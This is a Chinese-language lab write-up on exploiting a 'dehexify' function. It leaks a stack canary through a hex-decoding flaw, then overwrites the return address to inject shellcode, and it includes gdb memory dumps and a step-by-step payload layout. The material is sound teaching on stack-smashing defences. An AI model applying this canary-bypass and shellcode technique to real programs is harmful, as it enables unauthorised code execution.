## Main Idea

根据提示，这个任务开启了Stack Canary，很明显我们需要对其进行绕过。这个实验降低了难度，Canary值不包含空字节。所以很明显，我们可以把Canary输出出来，再将其插入我们的payload中即可。

函数`dehexify`的功能是将输入的十六进制字符串进行解码。例如，输入`\x41`则解码为`A`。在函数中，首先会检查是否存在`\x`，然后接下来的两个字符直接跳过。所以，我们可以让输入的字符串的最后四个字节只包含`\x`，这样结尾的空字符就会被当作输入的一部分进行解码，程序会持续输出(包括Canary)，直到遇上下一个空字符。

## Magic Numers

我们需要获取如下信息：`buffer`和`answer`的地址，以及`dehexify`的返回地址。
```
(gdb) p &c.buffer
$1 = (char (*)[16]) 0xffffda6c
```

```
(gdb) p &c.answer
$2 = (char (*)[16]) 0xffffda5c
```

```
(gdb) i f
Stack level 0, frame at 0xffffda90:
 eip = 0x8049215 in dehexify (dehexify.c:15); saved eip = 0x8049341
 called by frame at 0xffffdab0
 source language c.
 Arglist at 0xffffda88, args: 
 Locals at 0xffffda88, Previous frame's sp is 0xffffda90
 Saved registers:
  ebp at 0xffffda88, eip at 0xffffda8c
```

我们很容易画出栈布局，这对接下来payload的构造有很大帮助：

```
[    rip   ]             [0xffffda8c]
[    sfp   ]             [0xffffda88]
[  padding ]             [0xffffda80]
[   canary ]             [0xffffda7c]
[ c.buffer ]             [0xffffda6c]
[ c.answer ]             [0xffffda5c]
```

## Exploit Structure

1. 发送 `12B Padding + \x\n` 到程序，这一步是为了泄露Canary值。
2. 发送 `32B Padding + Canary + 12B Padding + SHELLCODE_addr + SHELLCODE`到程序，这一步完成了SHELLCODE的注入。

## Exploit GDB Output

进行爆破前：
```
(gdb) x/16x &c.answer
0xffffda5c:     0xffffdbfb      0x00000002      0x00000000      0x00000000
0xffffda6c:     0x00000000      0x00000000      0xffffdfe1      0x0804cfe8
0xffffda7c:     0x6e61073c      0x0804d020      0x00000000      0xffffda98
0xffffda8c:     0x08049341      0x00000000      0xffffdab0      0xffffdb2c
```

进行爆破后：
```
(gdb) x/20x &c.answer
0xffffda5c:     0x41414141      0x41414141      0x41414141      0x07ed56b1
0xffffda6c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda7c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffda8c:     0xb307ed56      0x41414141      0x41414141      0x41414141
0xffffda9c:     0xffffda90      0xdb31c031      0xd231c931      0xb05b32eb
```